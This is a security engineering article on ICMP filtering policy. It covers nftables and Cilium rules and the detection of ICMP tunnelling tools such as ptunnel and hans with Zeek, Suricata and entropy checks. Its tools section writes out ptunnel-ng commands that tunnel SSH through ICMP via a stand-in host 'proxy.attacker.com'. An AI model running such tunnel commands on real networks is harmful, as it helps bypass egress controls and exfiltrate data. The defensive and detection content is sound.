---
title: "ICMP Security: What to Allow, What to Block, and Detecting ICMP Tunnelling"
description: "Blindly blocking all ICMP breaks Path MTU Discovery, disables availability monitoring, and violates RFC requirements for IPv6. This article covers a practical ICMP filtering policy for nftables, ICMPv6 neighbour discovery requirements, covert channel detection for ICMP tunnelling tools like ptunnel and hans, and Zeek/Suricata detection rules."
slug: icmp-security-tunnelling
date: 2026-05-07
lastmod: 2026-05-07
category: network
tags:
  - icmp
  - tunnelling
  - firewall
  - network-filtering
  - covert-channels
personas:
  - security-engineer
  - network-engineer
article_number: 507
difficulty: Intermediate
estimated_reading_time: 11
published: true
layout: article.njk
permalink: /articles/network/icmp-security-tunnelling/
---

# ICMP Security: What to Allow, What to Block, and Detecting ICMP Tunnelling

## The Problem

The default security posture for ICMP in many organisations is one of two extremes: either allow everything and assume ping is harmless, or block everything at the perimeter because "ping is an attack vector." Both positions are wrong, and each in its own way creates operational and security problems.

Allowing all ICMP without restriction exposes hosts to ICMP floods, redirect injection, and — more critically — leaves open a covert channel that experienced attackers use routinely. ICMP tunnelling tools like `ptunnel`, `icmptunnel`, and `hans` encapsulate full TCP sessions inside ICMP echo request and reply payloads, allowing an attacker with shell access to a host behind a firewall that permits outbound ping to exfiltrate data, establish C2 sessions, or bypass egress controls entirely. The technique has been used in red team engagements and real-world intrusions since the early 2000s and remains effective wherever ping is allowed.

Blocking all ICMP is the more common mistake in hardened environments. It breaks Path MTU Discovery, causing silent TCP black holes where connections appear established but data transfer fails or hangs. It disables router time-exceeded messages, making traceroute useless for network troubleshooting. It prevents availability monitoring tools from differentiating between "host unreachable" and "host down." And for IPv6, blocking ICMPv6 entirely makes the network non-functional: Neighbour Discovery Protocol (NDP) — the IPv6 equivalent of ARP — is implemented entirely over ICMPv6 and cannot be disabled without breaking address resolution, router advertisement, and duplicate address detection.

The correct approach is selective ICMP filtering: allow the types that are operationally required or mandated by standards, rate-limit echo, block the types that have no legitimate inbound use case, and instrument the traffic to detect tunnelling.

This article covers the complete policy: a type-by-type reference, nftables hardening rules, ICMPv6-specific requirements, tunnelling detection with Zeek and Suricata, ICMP in Kubernetes with Cilium, and monitoring baselines.

## Why Blocking All ICMP is Operationally Destructive

### Path MTU Discovery

RFC 1191 (IPv4) and RFC 1981 (IPv6) define Path MTU Discovery (PMTUD) as the mechanism by which a host determines the maximum transmission unit along a path to a destination without fragmenting packets in transit. When a router on the path cannot forward a packet because it exceeds the outgoing interface MTU, it sends an ICMP type 3 code 4 message — "Fragmentation Needed and DF Bit Set" — back to the source with the MTU of the next-hop interface.

If that ICMP message is blocked by a firewall, the source never learns the MTU restriction. TCP connections that negotiate an MSS larger than an intermediate hop's MTU will establish successfully — the TCP handshake packets are small enough to pass — but data segments will be silently dropped by the router when they exceed the hop MTU. The result is a "PMTUD black hole": a connection that appears up at the TCP level but transfers no data, or transfers data at dramatically reduced rates as the OS eventually falls back to lower MSS values through heuristics.

ICMP type 3 code 4 **must be allowed inbound** to any host that communicates across the internet or across network segments with variable MTUs. This is not optional. Firewalls that block it create invisible connectivity failures that are extremely difficult to diagnose.

### Time Exceeded and Traceroute

ICMP type 11 (Time Exceeded) is sent by routers when a packet's TTL reaches zero. Traceroute works by sending packets with incrementally increasing TTLs and collecting the type 11 responses from each hop to map the path. Blocking type 11 inbound makes traceroute useless and makes network path troubleshooting significantly harder. There is no security justification for blocking inbound time exceeded messages to a host — they carry no payload that can be weaponised and cannot be used to reach protected services.

### Echo Reply for Monitoring

If you block ICMP echo-reply (type 0), your monitoring infrastructure cannot determine whether a host is reachable. This forces monitoring tools to fall back to TCP port probes, which have higher overhead and provide less fundamental reachability information. Inbound echo-reply from hosts your infrastructure has probed is required for any ping-based availability monitoring to function.

## ICMP Types Reference and Filtering Policy

The following table covers the ICMP types relevant to a practical filtering policy. Types not listed (many are obsolete or informational only) should be blocked by default.

| Type | Code | Name | Direction | Policy | Rationale |
|------|------|------|-----------|--------|-----------|
| 0 | 0 | Echo Reply | Inbound | Allow (rate-limit) | Required for outbound ping and monitoring |
| 3 | 0 | Net Unreachable | Inbound | Allow | Path feedback, needed for routing |
| 3 | 1 | Host Unreachable | Inbound | Allow | Path feedback |
| 3 | 3 | Port Unreachable | Inbound | Allow | Application unreachable feedback |
| 3 | 4 | Fragmentation Needed (PMTUD) | Inbound | **Must Allow** | PMTUD; blocking causes TCP black holes |
| 3 | 9–10 | Admin Prohibited | Inbound | Allow | Explicit reject feedback |
| 3 | 13 | Communication Admin Prohibited | Inbound | Allow | Firewall reject feedback |
| 4 | 0 | Source Quench | Any | Block | Deprecated in RFC 6633; no legitimate use |
| 5 | any | Redirect | Inbound | Block | MITM vector; disable at sysctl level too |
| 8 | 0 | Echo Request | Inbound | Allow (rate-limit) | Required for reachability monitoring |
| 8 | 0 | Echo Request | Outbound to internet | Block or restrict | Not needed unless explicit monitoring requirement |
| 9 | 0 | Router Advertisement | Inbound | Block (IPv4) | Should not arrive from internet |
| 10 | 0 | Router Solicitation | Outbound | Block (IPv4) | No legitimate use externally |
| 11 | 0 | TTL Exceeded in Transit | Inbound | Allow | Traceroute; path troubleshooting |
| 11 | 1 | Fragment Reassembly Time Exceeded | Inbound | Allow | Fragmentation diagnostics |
| 12 | 0 | Parameter Problem | Inbound | Allow | Header error feedback |
| 13 | 0 | Timestamp | Any | Block | Timing side-channel; not needed |
| 14 | 0 | Timestamp Reply | Any | Block | Timing side-channel |
| 15 | 0 | Information Request | Any | Block | Obsolete |
| 16 | 0 | Information Reply | Any | Block | Obsolete |
| 17 | 0 | Address Mask Request | Any | Block | Obsolete; historical MITM vector |
| 18 | 0 | Address Mask Reply | Any | Block | Obsolete |

ICMP types 0–255 not listed above should be blocked at the perimeter. The default posture is deny; the above types are explicit exceptions.

## nftables ICMP Hardening Policy

The following nftables ruleset implements the filtering policy above. It handles both IPv4 ICMP and ICMPv6 (covered in detail in the next section), applies rate limiting to echo traffic, and blocks redirect and timestamp types explicitly.

```nftables
#!/usr/sbin/nft -f

# /etc/nftables.d/icmp-policy.conf
# ICMP and ICMPv6 hardening policy
# Load after main table definition

table inet filter {

    # Rate limiting set for echo requests — prevents ICMP flood
    # Limit: 10 echo-request packets per second, burst of 20
    set icmp_echo_limit {
        type ipv4_addr
        flags dynamic, timeout
        timeout 60s
    }

    chain icmp_policy {
        # Echo reply — allow inbound (monitoring tools need this)
        icmp type echo-reply accept

        # Fragmentation needed (PMTUD) — must not be blocked
        icmp type destination-unreachable icmp code frag-needed accept

        # Destination unreachable variants
        icmp type destination-unreachable icmp code net-unreachable accept
        icmp type destination-unreachable icmp code host-unreachable accept
        icmp type destination-unreachable icmp code port-unreachable accept
        icmp type destination-unreachable icmp code admin-prohibited accept
        icmp type destination-unreachable icmp code host-admin-prohibited accept

        # Time exceeded (traceroute/TTL expiry feedback)
        icmp type time-exceeded accept

        # Parameter problem
        icmp type parameter-problem accept

        # Echo request — inbound with rate limiting
        # Drop if source exceeds 10 packets/second
        icmp type echo-request \
            add @icmp_echo_limit { ip saddr limit rate over 10/second burst 20 packets } \
            drop
        icmp type echo-request accept

        # Block redirect — MITM vector (complement sysctl net.ipv4.conf.all.accept_redirects=0)
        icmp type redirect drop comment "redirect injection MITM vector"

        # Block source quench — deprecated RFC 6633
        icmp type source-quench drop

        # Block timestamp — timing side-channel
        icmp type timestamp-request drop
        icmp type timestamp-reply drop

        # Block router advertisement/solicitation on internet-facing interfaces
        # (handle in interface-specific chains for internal interfaces)
        icmp type router-advertisement drop
        icmp type router-solicitation drop

        # Block address mask — obsolete attack vector
        # nftables does not have named constants for types 17/18;
        # match by numeric type
        icmp type 17 drop
        icmp type 18 drop

        # Default drop for all other ICMP types
        drop
    }

    chain input {
        type filter hook input priority 0; policy drop;

        # Established/related connections
        ct state established,related accept

        # Jump to ICMP policy for all ICMP
        ip protocol icmp jump icmp_policy

        # ... other rules
    }

    chain output {
        type filter hook output priority 0; policy accept;

        # Block outbound echo-request to RFC 1918 space is usually
        # fine; for internet-facing hosts that don't need outbound ping:
        # ip daddr != { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 } \
        #     icmp type echo-request drop
    }
}
```

To apply rate limiting to ICMP floods at the chain level before any type-specific processing, add a blanket rate limit at the top of the input chain:

```bash
# Blanket ICMP rate limit before type-specific processing
# Allows 100 ICMP packets/second total; logs and drops excess
nft add rule inet filter input ip protocol icmp \
    limit rate over 100/second burst 200 packets \
    log prefix "ICMP-FLOOD: " level warn drop
```

### Smurf Attack Prevention

A smurf attack amplifies ICMP by sending echo-requests with a spoofed source address to broadcast addresses, causing all hosts on the subnet to respond to the victim. The sysctl `net.ipv4.icmp_echo_ignore_broadcasts=1` prevents responding to broadcast-directed ICMP at the kernel level. The nftables complement blocks inbound echo-requests destined for broadcast or multicast addresses:

```nftables
# Block ICMP echo-request to broadcast/multicast — smurf amplification prevention
# Add to the icmp_policy chain before the echo-request accept rule
icmp type echo-request ip daddr 255.255.255.255 drop
icmp type echo-request ip daddr { 224.0.0.0/4 } drop
# Directed broadcasts (x.x.x.255) are harder to match generically;
# handle at the interface level with rp_filter and the kernel sysctl
```

### ICMP Redirect Hardening

ICMP redirects (type 5) allow a router to inform a host of a better next-hop for a destination. In practice, attackers on the local network can send crafted redirect messages to poison routing tables and redirect traffic through attacker-controlled nodes. The primary defence is the sysctl settings `net.ipv4.conf.all.accept_redirects=0` and `net.ipv4.conf.all.secure_redirects=0`, which prevent the kernel from acting on redirect messages regardless of what the firewall allows. The nftables rule above adds a second layer by dropping redirect packets before they reach the kernel's ICMP processing path. Both controls should be applied — defence in depth matters when the attack is this low-cost.

## ICMPv6: What You Cannot Block

IPv6 has a hard dependency on ICMPv6. The Neighbour Discovery Protocol (NDP), defined in RFC 4861, replaces IPv4 ARP entirely and is implemented over ICMPv6 types 133–137. Without NDP, IPv6 hosts cannot resolve link-layer addresses, cannot discover routers, cannot perform duplicate address detection, and cannot participate in stateless address autoconfiguration. Blocking these ICMPv6 types makes IPv6 non-functional.

| ICMPv6 Type | Name | Policy | Notes |
|-------------|------|--------|-------|
| 1 | Destination Unreachable | Allow | Includes PMTUD code 4 |
| 2 | Packet Too Big | **Must Allow** | IPv6 PMTUD — no DF bit, always used |
| 3 | Time Exceeded | Allow | Traceroute |
| 4 | Parameter Problem | Allow | Header error feedback |
| 128 | Echo Request | Allow (rate-limit) | Ping |
| 129 | Echo Reply | Allow | Ping response |
| 130 | Multicast Listener Query | Allow (internal) | MLDv2; multicast group management |
| 131 | Multicast Listener Report | Allow (internal) | MLDv2 |
| 132 | Multicast Listener Done | Allow (internal) | MLDv2 |
| 133 | Router Solicitation | Allow | NDP: host requests router |
| 134 | Router Advertisement | Allow (internal only) | NDP: router announces prefix; block from internet |
| 135 | Neighbour Solicitation | **Must Allow** | NDP: replaces ARP request |
| 136 | Neighbour Advertisement | **Must Allow** | NDP: replaces ARP reply |
| 137 | Redirect | Block | Same MITM risk as IPv4 redirect |
| 143 | Multicast Listener Report v2 | Allow (internal) | MLDv2 |

The nftables ICMPv6 policy:

```nftables
chain icmpv6_policy {
    # Packet Too Big — IPv6 PMTUD, must not be blocked under any circumstances
    icmpv6 type packet-too-big accept

    # Destination unreachable
    icmpv6 type destination-unreachable accept

    # Time exceeded (traceroute)
    icmpv6 type time-exceeded accept

    # Parameter problem
    icmpv6 type parameter-problem accept

    # Echo (rate-limited)
    icmpv6 type echo-request \
        limit rate 10/second burst 20 packets \
        accept
    icmpv6 type echo-request drop
    icmpv6 type echo-reply accept

    # NDP — must allow for IPv6 to function
    # Neighbour solicitation and advertisement: any source
    icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept

    # Router solicitation from link-local only (hosts asking for router)
    icmpv6 type nd-router-solicit ip6 saddr fe80::/10 accept

    # Router advertisement: accept from link-local (routers), block from internet
    # On internet-facing interfaces, this chain should only see RA from
    # link-local addresses; RA from global addresses is anomalous
    icmpv6 type nd-router-advert ip6 saddr fe80::/10 accept
    icmpv6 type nd-router-advert drop comment "RA from non-link-local — rogue RA"

    # Block redirect — same MITM concern as IPv4
    icmpv6 type nd-redirect drop

    # MLDv2 (multicast listener; internal only — fe80:: or :: source)
    icmpv6 type { mld-listener-query, mld-listener-report, mld-listener-done } \
        ip6 saddr { ::/128, fe80::/10 } accept

    # Drop everything else
    drop
}

chain input {
    type filter hook input priority 0; policy drop;
    ct state established,related accept
    meta l4proto icmpv6 jump icmpv6_policy
    # ... other rules
}
```

Note on IPv6 PMTUD: IPv6 requires Packet Too Big (type 2) even more critically than IPv4 requires type 3 code 4. IPv6 has no router fragmentation — all fragmentation is handled end-to-end. If an intermediate router encounters a packet larger than its MTU, it sends Packet Too Big and drops the packet. There is no fallback. Blocking ICMPv6 type 2 makes IPv6 TCP connections over heterogeneous MTU paths fail silently.

## ICMP Tunnelling: Techniques and Tools

ICMP tunnelling exploits a simple observation: many perimeter firewalls that block TCP and UDP from the internet to internal hosts still allow ICMP echo-request and echo-reply, on the assumption that ping is harmless. By encapsulating arbitrary data in the payload field of echo packets, an attacker can establish a bidirectional data channel through these firewalls.

The ICMP echo-request and echo-reply message formats include an unrestricted data payload field. Legitimate `ping` implementations use this field for a pattern of bytes (commonly a timestamp followed by a repeating byte pattern) to measure round-trip time. Nothing in the protocol prevents arbitrary data from occupying this field — the payload is not validated or restricted by routers in transit.

### ptunnel

`ptunnel` (Ping Tunnel) is the most widely-known ICMP tunnelling tool. It runs a proxy server on a host reachable from the internet that the target firewall allows ping through. A client on the isolated host connects to the proxy using ICMP echo; the proxy forwards the encapsulated TCP connection to the actual destination. Full TCP over ICMP, using ICMP echo-request/reply as the transport layer.

```bash
# ptunnel server (on internet-accessible proxy host)
ptunnel-ng -x secretpassword

# ptunnel client (on isolated host behind firewall)
# Creates local TCP listener on port 8080 that tunnels to
# proxy:22 (SSH) through ICMP
ptunnel-ng -p proxy.attacker.com -lp 8080 -da 192.168.1.10 -dp 22 -x secretpassword

# Now SSH through the ICMP tunnel:
ssh -p 8080 user@127.0.0.1
```

### icmptunnel

`icmptunnel` creates a full IP tunnel over ICMP, allowing any IP traffic — not just TCP — to pass through. It creates a TUN interface at each endpoint and forwards all IP packets as ICMP payload. This is more powerful than ptunnel because it tunnels the entire IP layer, not just individual TCP connections.

### hans

`hans` (another ICMP tunnelling tool) works similarly to icmptunnel but with a simpler client/server model designed for ease of deployment. It also creates TUN interfaces and handles IP-over-ICMP.

All three tools share the same detectable characteristic: they transmit substantially more data in ICMP payload fields than any legitimate ping implementation ever would.

## Detecting ICMP Tunnelling

### Payload Size Anomalies

Legitimate `ping` implementations send small, fixed-size payloads:

- Linux `ping` default: 56 bytes data (64 bytes ICMP total, 84 bytes IP total)
- Windows `ping` default: 32 bytes data
- macOS `ping` default: 56 bytes data

ICMP tunnelling tools send payloads as large as the MTU will allow — typically 1400–1472 bytes — to maximise throughput. A stream of ICMP echo-request packets with 1400-byte payloads is unambiguous evidence of tunnelling. Additionally, legitimate ping traffic has highly consistent payload sizes (the same size for every packet in a sequence); tunnel traffic has variable payload sizes matching the varying sizes of the encapsulated data.

Detection threshold: any ICMP echo-request payload exceeding 100 bytes from an external host warrants investigation. Payloads exceeding 500 bytes are effectively certain to be tunnel traffic.

### Zeek Detection Rules

Zeek's ICMP analysis framework provides the data needed to detect tunnelling. The following Zeek script raises a notice for ICMP payloads that exceed the size expected for legitimate ping:

```zeek
# /etc/zeek/site/icmp-tunnel-detect.zeek
# Detect ICMP tunnelling based on payload size and rate anomalies

@load base/frameworks/notice

module ICMPTunnel;

export {
    redef enum Notice::Type += {
        Large_ICMP_Payload,
        ICMP_Tunnel_Suspected,
    };

    # Threshold: ICMP payload bytes above this size are suspicious
    const large_payload_threshold = 128 &redef;

    # Rate threshold: N large-payload ICMP packets in time window
    const tunnel_packet_count = 10 &redef;
    const tunnel_time_window = 60 sec &redef;
}

# Track large-payload ICMP echo packets per source
global icmp_large_counts: table[addr] of count &default=0 &create_expire=60sec;
global icmp_large_start: table[addr] of time &default=network_time();

event icmp_echo_request(c: connection, icmp: icmp_conn, id: count,
                        seq: count, payload: string) {
    local plen = |payload|;

    if ( plen > large_payload_threshold ) {
        NOTICE([$note=Large_ICMP_Payload,
                $conn=c,
                $msg=fmt("ICMP echo-request from %s: payload %d bytes (threshold %d)",
                         c$id$orig_h, plen, large_payload_threshold),
                $identifier=cat(c$id$orig_h)]);

        icmp_large_counts[c$id$orig_h] += 1;

        if ( icmp_large_counts[c$id$orig_h] >= tunnel_packet_count ) {
            NOTICE([$note=ICMP_Tunnel_Suspected,
                    $conn=c,
                    $msg=fmt("ICMP tunnel suspected from %s: %d large-payload echo-requests in %s",
                             c$id$orig_h,
                             icmp_large_counts[c$id$orig_h],
                             tunnel_time_window),
                    $identifier=cat(c$id$orig_h),
                    $suppress_for=10 min]);
            delete icmp_large_counts[c$id$orig_h];
        }
    }
}
```

Load it in `/etc/zeek/site/local.zeek`:

```zeek
@load site/icmp-tunnel-detect
```

### Suricata Detection Rules

Suricata can match ICMP payload content and size. The following rules detect known tunnel tool characteristics:

```suricata
# /etc/suricata/rules/icmp-tunnel.rules

# Large ICMP payload — generic tunnelling indicator
# dsize matches the ICMP data payload, not including ICMP header
alert icmp any any -> $HOME_NET any (
    msg:"ICMP Tunnelling - Oversized Echo Request Payload";
    itype:8;
    dsize:>200;
    classtype:policy-violation;
    sid:9100001;
    rev:1;
)

alert icmp any any -> $HOME_NET any (
    msg:"ICMP Tunnelling - Very Large Payload Consistent with IP-in-ICMP";
    itype:8;
    dsize:>1000;
    classtype:trojan-activity;
    priority:1;
    sid:9100002;
    rev:1;
)

# ptunnel characteristic: fixed magic value in payload header
# ptunnel uses a 4-byte magic 0xD5200880 at offset 0 in the ICMP payload
alert icmp any any -> any any (
    msg:"ICMP ptunnel Magic Value Detected";
    itype:8;
    content:"|D5 20 08 80|";
    offset:0;
    depth:4;
    classtype:trojan-activity;
    priority:1;
    sid:9100003;
    rev:1;
)

# hans characteristic: IP header embedded in ICMP payload
# hans embeds a full IP header starting with 0x45 (IPv4, IHL=5) at offset 0
alert icmp any any -> any any (
    msg:"ICMP hans Tunnel - IP Header in Payload";
    itype:8;
    dsize:>40;
    content:"|45|";
    offset:0;
    depth:1;
    classtype:trojan-activity;
    priority:1;
    sid:9100004;
    rev:1;
)

# Outbound echo-request flood from internal host — tunnel client or DoS
alert icmp $HOME_NET any -> any any (
    msg:"ICMP Echo-Request Rate Anomaly - Potential Tunnel Client";
    itype:8;
    detection_filter: track by_src, count 50, seconds 10;
    classtype:policy-violation;
    sid:9100005;
    rev:1;
)
```

### Payload Entropy Analysis

ICMP tunnelling traffic carrying encrypted or compressed data (which it almost always does, because the tunnelled connections are typically SSH or TLS) has high payload entropy — close to 8 bits per byte. Legitimate ping payloads have low entropy: the default Linux ping payload is a repeating sequence of ASCII characters, with entropy around 3–4 bits per byte.

Tools like `p0f` and network analysis scripts using Shannon entropy can flag ICMP payloads with entropy above 7.5 bits/byte. This is a strong indicator of encrypted tunnel traffic.

For a quick Python check against a pcap:

```python
#!/usr/bin/env python3
# icmp_entropy_check.py — flag high-entropy ICMP payloads
import math
import sys
from scapy.all import rdpcap, ICMP

def entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    return -sum((c/n) * math.log2(c/n) for c in counts if c > 0)

ENTROPY_THRESHOLD = 7.2
SIZE_THRESHOLD = 100  # bytes — ignore small legitimate pings

packets = rdpcap(sys.argv[1])
for pkt in packets:
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # echo-request
        payload = bytes(pkt[ICMP].payload)
        if len(payload) > SIZE_THRESHOLD:
            h = entropy(payload)
            if h > ENTROPY_THRESHOLD:
                src = pkt.sprintf("%IP.src%")
                dst = pkt.sprintf("%IP.dst%")
                print(f"HIGH ENTROPY ICMP: {src} -> {dst} "
                      f"len={len(payload)} entropy={h:.2f}")
```

## ICMP in Kubernetes

Standard Kubernetes NetworkPolicy resources operate at Layer 4 (TCP/UDP) and do not provide ICMP type filtering. A NetworkPolicy that appears to block all ingress traffic still permits ICMP echo by default in most CNI implementations — `ipTables`-based CNIs like Flannel and Calico (in iptables mode) do not enforce NetworkPolicy restrictions on ICMP.

### Cilium ICMP Network Policy

Cilium, using eBPF-based enforcement, supports ICMP type filtering in both `CiliumNetworkPolicy` and `CiliumClusterwideNetworkPolicy` resources.

```yaml
# Allow only ICMP echo-request/reply and PMTUD-required types
# Block all other ICMP including oversized echo that could indicate tunnelling
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: icmp-restrict
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: web
  ingress:
    - fromEntities:
        - world
      icmps:
        - fields:
            - family: IPv4
              type: 8   # Echo request — rate limiting handled by nftables on node
            - family: IPv4
              type: 0   # Echo reply
            - family: IPv4
              type: 3   # Destination unreachable (includes PMTUD code 4)
            - family: IPv4
              type: 11  # Time exceeded
  egress:
    - toEntities:
        - world
      icmps:
        - fields:
            - family: IPv4
              type: 0   # Echo reply (responses to monitoring)
            - family: IPv4
              type: 3   # Destination unreachable
            - family: IPv4
              type: 11  # Time exceeded
```

Note that Cilium's ICMP filtering matches on type only, not code. The fragmentation-needed code (code 4) within type 3 is permitted by allowing type 3 generally. If you need to restrict specific codes within type 3 (e.g., block type 3 code 3 port-unreachable while allowing code 4), you must implement that at the node-level nftables layer rather than through CiliumNetworkPolicy.

For clusters where Cilium is not available, the practical mitigation is to ensure pod-to-external-internet ICMP is blocked at the node's nftables policy (which applies regardless of CNI), and that internal ICMP is monitored by a DaemonSet-deployed Zeek or Suricata instance with the rules above.

## Monitoring ICMP Traffic

### Baseline Establishment

Normal ICMP traffic on a production network follows predictable patterns:

- **Volume:** Monitoring pings at regular intervals (30s or 60s) produce steady, low-rate echo-request traffic. Any significant deviation from this baseline — particularly sudden increases in echo-request rate or payload volume — is anomalous.
- **Payload size distribution:** In a legitimate environment, nearly all ICMP echo payloads cluster at 32 bytes (Windows) or 56 bytes (Linux/macOS). A bimodal or uniform distribution across sizes indicates mixed legitimate and tunnel traffic.
- **Type distribution:** In normal operation, type 0 and type 8 (echo/reply) dominate. A sudden appearance of type 3 code 4 messages suggests MTU issues on a path. Type 5 (redirect) appearing from a host that is not a router indicates either misconfiguration or an active redirect injection attack.
- **Duration:** Legitimate ping sessions are short (a few seconds of monitoring probes). Sustained ICMP echo-request/reply sessions lasting minutes or hours with consistent or increasing payload sizes are strong tunnel indicators.

### Alerting Rules (Prometheus/Alertmanager)

If you are collecting ICMP metrics through node exporters or a flow collection system (NetFlow, IPFIX, sFlow) pushed into Prometheus:

```yaml
# prometheus/alerts/icmp.yml
groups:
  - name: icmp_anomalies
    rules:
      - alert: ICMPFlood
        expr: |
          rate(network_icmp_inbound_packets_total{type="echo-request"}[1m]) > 100
        for: 30s
        labels:
          severity: warning
        annotations:
          summary: "ICMP echo-request flood on {{ $labels.instance }}"
          description: >
            {{ $labels.instance }} receiving {{ $value | humanize }} ICMP
            echo-requests/second. Normal monitoring traffic is < 5/second.

      - alert: ICMPLargePayload
        expr: |
          avg(network_icmp_payload_bytes_avg{type="echo-request"}) > 200
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "Large ICMP payload detected — possible tunnel"
          description: >
            Average ICMP echo-request payload on {{ $labels.instance }} is
            {{ $value }} bytes. Legitimate ping payloads are < 64 bytes.
            Investigate for ICMP tunnelling.
```

### Flow-Based Detection

If your environment exports NetFlow or IPFIX, ICMP tunnelling is visible in flow data even without DPI:

- Flows with `protocol=1` (ICMP), long duration (>60 seconds), high byte count (>10KB), and consistent packet rate are tunnel sessions.
- Legitimate monitoring flows have very low byte counts per flow (each ping is a single small request and reply pair).

A Zeek-level flow summary is also effective. The `Conn::LOG` entries for ICMP connections with `resp_bytes > 50000` or `duration > 300` seconds are reliable tunnel indicators.

## Summary: Minimum Required ICMP Policy

Three rules that must be in every policy:

1. **Allow ICMP type 3 code 4 (fragmentation needed) inbound.** Blocking it causes silent TCP black holes on any path with variable MTUs. This is non-negotiable.
2. **Allow ICMPv6 types 135 and 136 (neighbour solicitation and advertisement) in both directions.** Blocking them makes IPv6 non-functional on the host.
3. **Allow ICMPv6 type 2 (packet too big) inbound.** IPv6 PMTUD depends entirely on this message.

Beyond these three, apply the type table in this article, rate-limit echo to prevent floods, block redirects at both the firewall and sysctl layers, and instrument with Zeek or Suricata to detect the payload size and entropy anomalies that identify tunnelling traffic. ICMP is a small protocol with a large attack surface — the filtering policy is straightforward once the operational requirements are understood.
